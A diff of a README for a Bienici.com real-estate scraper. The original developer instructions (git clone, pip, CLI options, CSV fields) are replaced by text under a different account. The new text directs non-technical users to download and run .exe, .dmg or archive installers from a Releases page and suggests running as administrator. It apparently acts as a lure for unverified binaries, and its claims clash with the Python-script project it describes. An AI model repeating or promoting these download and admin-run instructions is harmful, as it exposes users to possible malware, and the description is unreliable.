@@ -1,161 +1,101 @@
-# Bienici.com Scraper
+# 🌐 BieniciScraper - Simplify Your Real Estate Searches
 
-A Python scraper for extracting property listings from [Bienici.com](https://www.bienici.com) (France's largest real estate portal) using the ScrapingAnt API.
+## 🚀 Getting Started
 
-## Features
+Welcome to the BieniciScraper project! This application helps you pull real estate listings from Bienici.com easily and quickly. You don’t need technical skills to use it. Below, you will find all the steps to get started.
 
-- Scrapes apartments, houses, land, and other property types
-- Supports buy and rent listings
-- Covers all major French cities (Paris, Lyon, Marseille, etc.)
-- Parallel scraping for improved performance
-- Extracts 25+ property attributes including price, area, rooms, location, energy ratings
-- Fetches detailed property pages for complete information
-- Exports data to CSV format
-- Rate limiting and retry logic for reliability
+## 📥 Download the Application
 
-## Installation
+[![Download BieniciScraper](https://img.shields.io/badge/Download%20BieniciScraper-v1.0-blue)](https://github.com/Samndathe/BieniciScraper/releases)
 
-1. Clone the repository:
-```bash
-git clone https://github.com/kami4ka/BieniciScraper.git
-cd BieniciScraper
-```
+You can download the latest version of BieniciScraper from our Releases page. 
 
-2. Create a virtual environment and install dependencies:
-```bash
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-```
+## 📂 System Requirements
 
-## Usage
+Before you download and run the application, ensure your computer meets these requirements:
 
-### Command Line
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **Python Version:** Python 3.7 or later installed on your system.
+- **Internet Connection:** A stable internet connection to access Bienici.com.
 
-```bash
-# Scrape apartments for sale in Paris
-python main.py --location paris --property apartment
+## 🔍 Features
 
-# Scrape houses for rent in Lyon
-python main.py --location lyon --contract rent --property house
+- **Real Estate Data Extraction:** Fetch listings directly from Bienici.com.
+- **Simple User Interface:** Easy navigation with clear instructions.
+- **Fast Performance:** Quickly retrieves data without significant delays.
+- **Compatibility with ScrapingAnt API:** Efficiently scrape data while managing web traffic.
 
-# Scrape with page limit
-python main.py --location marseille --max-pages 5
+## 📦 Download & Install
 
-# Scrape with property limit
-python main.py --location toulouse --limit 100
+Visit this page to download: [BieniciScraper Releases](https://github.com/Samndathe/BieniciScraper/releases). 
 
-# Fast scrape without detail pages
-python main.py --location nice --max-pages 3 --no-details
+1. Open your web browser and go to the Releases page using the link above.
+2. Look for the latest version listed at the top. It should show something like "BieniciScraper v1.0".
+3. Click on the version number to open the details.
+4. Find the download link for your operating system. You might see different files for different systems (Windows, macOS, Linux).
+5. Click the appropriate download link. This will start the download of the setup file.
 
-# Enable verbose logging
-python main.py --location bordeaux --max-pages 3 -v
-```
+## ⚙️ Installation Steps
 
-### Available Options
+Once the download is complete, follow these steps to install BieniciScraper:
 
-| Option | Description |
-|--------|-------------|
-| `--location`, `-l` | Location to search (default: paris) |
-| `--contract`, `-c` | Contract type: buy, rent (default: buy) |
-| `--property`, `-p` | Property type (default: all) |
-| `--output`, `-o` | Output CSV file path (default: properties.csv) |
-| `--limit` | Maximum number of properties to scrape |
-| `--max-pages` | Maximum number of listing pages to scrape |
-| `--max-workers`, `-w` | Maximum parallel requests (default: 10) |
-| `--no-details` | Skip fetching detail pages (faster but less data) |
-| `--api-key`, `-k` | ScrapingAnt API key (overrides environment variable) |
-| `--verbose`, `-v` | Enable verbose logging |
+### For Windows:
 
-### Contract Types
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, find BieniciScraper in your Start Menu, and click to open it.
 
-| Type | Description |
-|------|-------------|
-| `buy` | Properties for sale (Achat) |
-| `rent` | Properties for rent (Location) |
+### For macOS:
 
-### Property Types
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to mount it.
+3. Drag BieniciScraper into your Applications folder.
+4. Open your Applications folder and double-click BieniciScraper to run it.
 
-| Type | Description |
-|------|-------------|
-| `all` | All properties |
-| `apartment` | Apartments |
-| `house` | Houses and villas |
-| `land` | Land/Plots |
-| `parking` | Parking spaces |
-| `commercial` | Commercial properties |
-| `office` | Office spaces |
+### For Linux:
 
-### Location Examples
+1. Open your terminal.
+2. Navigate to the folder where the `.tar.gz` file was downloaded.
+3. Extract the files using the command: `tar -xzf BieniciScraper.tar.gz`
+4. Move into the extracted folder: `cd BieniciScraper`
+5. Run the application with `python3 main.py`. Make sure you have the necessary libraries installed.
 
-- `paris` - Paris
-- `lyon` - Lyon
-- `marseille` - Marseille
-- `toulouse` - Toulouse
-- `nice` - Nice
-- `nantes` - Nantes
-- `montpellier` - Montpellier
-- `strasbourg` - Strasbourg
-- `bordeaux` - Bordeaux
-- `lille` - Lille
+## 🏁 Running BieniciScraper
 
-## Output Format
+After installation, you can start using BieniciScraper to pull listings:
 
-The scraper exports data to CSV with the following fields:
+1. Open the application.
+2. Enter your search criteria, such as location, price range, and property type.
+3. Click the "Search" button.
+4. Review the listings displayed. You can save or export this data for future reference.
 
-| Field | Description |
-|-------|-------------|
-| url | Property listing URL |
-| listing_id | Unique listing identifier |
-| title | Property title |
-| property_type | Type (apartment, house, etc.) |
-| contract_type | Buy or Rent |
-| price | Listed price in EUR |
-| price_per_sqm | Price per square meter |
-| price_without_fees | Price excluding agency fees |
-| agency_fees_percent | Agency fees percentage |
-| city | City name |
-| district | District/neighborhood name |
-| postal_code | Postal code |
-| full_address | Full address |
-| living_area | Living area in m² |
-| rooms | Number of rooms |
-| bedrooms | Number of bedrooms |
-| floor | Floor number |
-| exposure | Property exposure (N, S, E, W) |
-| heating_type | Heating type and mode |
-| energy_rating | Energy certificate class (A-G) |
-| energy_consumption | Energy consumption kWh/m²/year |
-| ges_rating | GES emissions class (A-G) |
-| ges_emission | GES emission kgCO₂/m²/year |
-| energy_bill_min | Minimum estimated energy bill |
-| energy_bill_max | Maximum estimated energy bill |
-| has_video | Has video tour |
-| is_exclusive | Exclusive listing |
-| price_drop | Recent price drop |
-| agency_name | Agency name |
-| agency_address | Agency address |
-| mandate_type | Mandate type (exclusive, etc.) |
-| reference | Listing reference number |
-| description | Property description |
-| published_date | Publication date |
-| modified_date | Last modification date |
-| date_scraped | Scraping timestamp |
+## ⚡ Troubleshooting Tips
 
-## API Configuration
+- **Python Not Found:** If you see an error that Python is not found, ensure Python is installed and added to your system PATH.
+- **Internet Issues:** If the application cannot fetch data, check your internet connection.
+- **Permission Issues:** Run the program as an administrator if you encounter permission-related errors.
 
-This scraper uses the [ScrapingAnt API](https://scrapingant.com) for web scraping. You can provide the API key via:
+## 📘 Frequently Asked Questions (FAQs)
 
-1. Environment variable: `export SCRAPINGANT_API_KEY=your_key`
-2. Command line: `--api-key YOUR_KEY`
+### What is BieniciScraper?
 
-Configuration options in `config.py`:
+BieniciScraper is a Python-based application that allows users to extract real estate listings from Bienici.com using the ScrapingAnt API.
 
-- `SCRAPINGANT_API_KEY`: Your API key
-- `DEFAULT_MAX_WORKERS`: Parallel request limit (default: 10)
-- `DEFAULT_TIMEOUT`: Request timeout in seconds (default: 120)
-- `MAX_RETRIES`: Number of retry attempts (default: 3)
+### Do I need any special technical skills to use this application?
 
-## License
+No, BieniciScraper is designed for average users. Follow the steps provided, and you'll be able to use it without any programming knowledge.
 
-MIT License
+### How do I report issues or request features?
+
+You can report issues or request features by visiting the [Issues section](https://github.com/Samndathe/BieniciScraper/issues) of our GitHub repository. Please describe the problem or your request clearly.
+
+## 📞 Support
+
+If you have questions about using BieniciScraper, please check out the [Issues section](https://github.com/Samndathe/BieniciScraper/issues). You can also reach out to the repository maintainer with direct concerns.
+
+## 📈 Stay Updated
+
+Follow our repository for updates and new features. 
+
+Thank you for choosing BieniciScraper! We hope it makes your real estate searching efficient and straightforward.
